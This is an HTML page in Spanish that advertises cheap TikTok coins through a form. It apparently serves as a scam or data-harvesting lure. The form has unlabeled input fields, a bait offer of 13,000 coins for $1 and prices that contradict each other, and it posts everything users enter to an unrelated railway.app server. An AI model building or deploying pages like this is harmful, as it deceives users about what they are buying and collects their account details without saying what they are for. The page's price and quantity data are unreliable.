<!DOCTYPE html>
<html lang="es">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Compra TikTok Coins</title>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, Helvetica, sans-serif;
}

body{
    background-image:url("./fondo.jpg");
    background-repeat:no-repeat;
    background-position:center;
    background-size:cover;
    background-attachment:fixed;

    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh;
}

.formulario{
    width:430px;
    background:rgba(0,0,0,.60);
    backdrop-filter:blur(12px);
    border-radius:20px;
    padding:35px;
    border:1px solid rgba(255,255,255,.25);
    box-shadow:0 0 40px rgba(0,0,0,.7);
}

h1{
    color:white;
    text-align:center;
    margin-bottom:10px;
    font-size:34px;
}

p{
    color:#ddd;
    text-align:center;
    margin-bottom:30px;
}

input,
select{
    width:100%;
    padding:15px;
    margin-bottom:18px;
    border:none;
    border-radius:10px;
    outline:none;
    font-size:16px;
    background:white;
}

.precio{
    width:100%;
    padding:15px;
    margin-bottom:18px;
    border-radius:10px;
    background:rgba(255,255,255,.95);
    color:#111;
    font-size:18px;
    font-weight:bold;
    text-align:center;
}

button{
    width:100%;
    padding:15px;
    border:none;
    border-radius:10px;
    font-size:18px;
    font-weight:bold;
    background:linear-gradient(90deg,#ff0050,#00f2ea);
    color:white;
    cursor:pointer;
    transition:.3s;
}

button:hover{
    transform:scale(1.03);
}

</style>

</head>

<body>

<div class="formulario">

<h1>Compra tus Monedas</h1>

<p>Completa tus datos para continuar.</p>

<form id="pedidoForm">

<!-- PREGUNTA 1 -->

<input
type="text"
id="usuario"
placeholder="1. "
>

<!-- PREGUNTA 2 -->

<input
type="text"
id="tiktok"
placeholder="2. "
>

<!-- PREGUNTA 3 -->

<input
type="text"
id="dato3"
placeholder="3. "
>

<!-- PREGUNTA 4 -->

<input
type="text"
id="dato4"
placeholder="4. "
>

<!-- PREGUNTA 5 -->

<input
type="text"
id="dato5"
placeholder="5. link de tik tok"
>

<!-- PREGUNTA 6: MONEDAS -->

<select id="monedas" required>

<option value="">6. Selecciona cantidad de monedas</option>

<option value="5000" data-precio="30">
💎 5.000 monedas — $5
</option>

<option value="10000" data-precio="1">
💎 13.000 monedas — $1
</option>

<option value="20000" data-precio="90">
💎 20.000 monedas — $90
</option>

<option value="40000" data-precio="150">
💎 40.000 monedas — $150
</option>

<option value="60000" data-precio="200">
💎 60.000 monedas — $200
</option>

<option value="100000" data-precio="350">
💎 100.000 monedas — $350
</option>

</select>

<div class="precio" id="precio">
💰 Precio: Selecciona un paquete
</div>

<button type="submit">
CONTINUAR
</button>

</form>

<script>

const monedasSelect = document.getElementById("monedas");
const precio = document.getElementById("precio");


// ==========================================
// MOSTRAR PRECIO AUTOMÁTICAMENTE
// ==========================================

monedasSelect.addEventListener("change", function(){

    const opcion = this.options[this.selectedIndex];

    if(!opcion.value){

        precio.textContent =
            "💰 Precio: Selecciona un paquete";

        return;
    }

    const precioSeleccionado =
        opcion.dataset.precio;

    precio.textContent =
        "💰 Precio: $" + precioSeleccionado + " USD";

});


// ==========================================
// ENVIAR FORMULARIO
// ==========================================

document.getElementById("pedidoForm").addEventListener(
    "submit",
    async function(e){

        e.preventDefault();

        const opcion =
            monedasSelect.options[
                monedasSelect.selectedIndex
            ];

        const datos = {

            usuario:
                document.getElementById("usuario").value,

            tiktok:
                document.getElementById("tiktok").value,

            dato3:
                document.getElementById("dato3").value,

            dato4:
                document.getElementById("dato4").value,

            dato5:
                document.getElementById("dato5").value,

            monedas:
                opcion.value,

            precio:
                opcion.dataset.precio,

            metodo:
                "Pendiente"

        };


        try{

            const respuesta = await fetch(
    "https://overflowing-renewal-production-1a4d.up.railway.app/enviar",
                {
                    method:"POST",

                    headers:{
                        "Content-Type":"application/json"
                    },

                    body:JSON.stringify(datos)
                }
            );


            if(respuesta.ok){

                alert(
                    "✅ Pedido enviado correctamente."
                );

                document
                    .getElementById("pedidoForm")
                    .reset();

                precio.textContent =
                    "💰 Precio: Selecciona un paquete";

            }else{

                alert(
                    "❌ Error al enviar el pedido."
                );

            }

        }catch(error){

            alert(
                "❌ No se pudo conectar con el servidor."
            );

        }

    }
);

</script>

</div>

</body>

</html>
